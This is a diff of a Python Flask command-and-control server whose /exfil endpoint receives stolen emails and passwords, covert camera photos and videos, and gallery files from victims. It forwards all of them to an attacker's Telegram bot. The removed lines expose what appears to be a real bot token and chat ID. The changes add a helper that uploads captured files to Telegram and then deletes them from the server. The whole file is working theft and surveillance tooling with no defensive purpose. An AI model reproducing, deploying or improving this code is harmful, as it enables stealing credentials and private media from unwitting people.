@@ -1,37 +1,19 @@
-import os
-import sys
+from flask import Flask, request, jsonify
+import requests
 import json
 import base64
+import os
 import csv
 import re
 from datetime import datetime
-from flask import Flask, request, jsonify
-import requests
-
-# ============================================================
-# CONFIG — CHANGE THESE
-# ============================================================
-TELEGRAM_TOKEN = "8440979863:AAE8OS_UzuvJV6T-sEqC9PuO0TvNUNapur8"
-TELEGRAM_CHAT_ID = "8204622013"
-# ============================================================
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)  # Fixes 400 error on Render
 
-# Create folders
-for folder in ["photos", "videos", "audio", "gallery", "logs"]:
-    os.makedirs(folder, exist_ok=True)
+# ===== YOUR CONFIG =====
+TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
+# =======================
 
-# Credentials log
-CREDENTIAL_CSV = os.path.join("logs", "credentials.csv")
-if not os.path.exists(CREDENTIAL_CSV):
-    with open(CREDENTIAL_CSV, 'w', newline='', encoding='utf-8') as f:
-        writer = csv.writer(f)
-        writer.writerow(['timestamp', 'email', 'password', 'ip'])
-
-# ============================================================
-# TELEGRAM HELPER
-# ============================================================
 def send_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
@@ -42,14 +24,26 @@ def send_telegram(message):
         else:
             requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=5)
         print("[✓] Forwarded to Telegram")
-        return True
     except Exception as e:
         print(f"[!] Telegram error: {e}")
+
+def send_file_to_telegram(file_path, caption=""):
+    """Send a file to Telegram as a document"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as f:
+            files = {'document': f}
+            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
+            response = requests.post(url, files=files, data=data, timeout=30)
+            if response.status_code == 200:
+                print(f"[✓] File sent to Telegram: {file_path}")
+            else:
+                print(f"[!] Failed to send file: {response.text}")
+        return True
+    except Exception as e:
+        print(f"[!] Error sending file: {e}")
         return False
 
-# ============================================================
-# CORS MIDDLEWARE
-# ============================================================
 @app.after_request
 def add_cors(response):
     response.headers['Access-Control-Allow-Origin'] = '*'
@@ -58,32 +52,19 @@ def add_cors(response):
     response.headers['Access-Control-Allow-Credentials'] = 'true'
     return response
 
-# ============================================================
-# ROUTES
-# ============================================================
 @app.route('/exfil', methods=['GET', 'POST', 'OPTIONS'])
 def exfil():
-    # Handle preflight
     if request.method == 'OPTIONS':
         return '', 200
     
     try:
-        # Parse data — with safe fallback
-        data = {}
         if request.method == 'GET':
             data = request.args.to_dict()
         elif request.is_json:
-            try:
-                data = request.get_json(force=True, silent=True) or {}
-            except:
-                data = {}
+            data = request.get_json(force=True, silent=True) or {}
         else:
-            try:
-                data = request.form.to_dict()
-            except:
-                data = {'raw': request.data.decode('utf-8', errors='ignore')}
+            data = request.form.to_dict() or {'raw': request.data.decode('utf-8', errors='ignore')}
         
-        # Get IP
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         if ip and ',' in ip:
             ip = ip.split(',')[0].strip()
@@ -97,9 +78,6 @@ def exfil():
         if data_type == 'credentials':
             email = data.get('email', '')
             password = data.get('pass', '')
-            with open(CREDENTIAL_CSV, 'a', newline='', encoding='utf-8') as f:
-                writer = csv.writer(f)
-                writer.writerow([data['timestamp'], email, password, ip])
             send_telegram(f"🔐 <b>Credentials</b>\n📧 {email}\n🔑 {password}\n🌐 IP: {ip}")
             return jsonify({"status": "OK"}), 200
         
@@ -116,10 +94,12 @@ def exfil():
             raw = data.get('data', '')
             camera = data.get('camera', 'unknown')
             if raw:
-                filename = f"photos/{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+                filename = f"{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                 with open(filename, 'wb') as f:
                     f.write(base64.b64decode(raw))
-                send_telegram(f"📸 Photo ({camera} camera)\nSaved: {filename}")
+                send_file_to_telegram(filename, f"📸 Photo ({camera} camera)\nIP: {ip}")
+                os.remove(filename)
+                print(f"[✓] Photo forwarded to Telegram")
             return jsonify({"status": "OK"}), 200
         
         # === VIDEO ===
@@ -127,10 +107,12 @@ def exfil():
             raw = data.get('data', '')
             camera = data.get('camera', 'front')
             if raw:
-                filename = f"videos/{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
+                filename = f"{camera}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
                 with open(filename, 'wb') as f:
                     f.write(base64.b64decode(raw))
-                send_telegram(f"🎥 Video ({camera} camera)\nSaved: {filename}")
+                send_file_to_telegram(filename, f"🎥 Video ({camera} camera)\nIP: {ip}")
+                os.remove(filename)
+                print(f"[✓] Video forwarded to Telegram")
             return jsonify({"status": "OK"}), 200
         
         # === GALLERY FILE ===
@@ -139,13 +121,12 @@ def exfil():
             filepath = data.get('path', '')
             raw = data.get('data', '')
             if raw:
-                session = datetime.now().strftime('%Y%m%d')
-                os.makedirs(f"gallery/{session}", exist_ok=True)
                 safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
-                final_path = f"gallery/{session}/{datetime.now().strftime('%H%M%S')}_{safe_name}"
-                with open(final_path, 'wb') as f:
+                with open(safe_name, 'wb') as f:
                     f.write(base64.b64decode(raw))
-                send_telegram(f"📁 Gallery file\n📄 {filename}\n📂 {filepath}")
+                send_file_to_telegram(safe_name, f"📁 Gallery file\n📄 {filename}\n📂 {filepath}")
+                os.remove(safe_name)
+                print(f"[✓] Gallery file forwarded: {filename}")
             return jsonify({"status": "OK"}), 200
         
         # === MEDIA COMPLETE ===
@@ -178,11 +159,8 @@ def ping():
 
 @app.route('/', methods=['GET'])
 def home():
-    return jsonify({"status": "C2 Server Running", "endpoints": ["/ping", "/exfil"]}), 200
+    return jsonify({"status": "C2 Server Running"}), 200
 
-# ============================================================
-# MAIN
-# ============================================================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     print(f"🚀 C2 Server Running on port {port}")
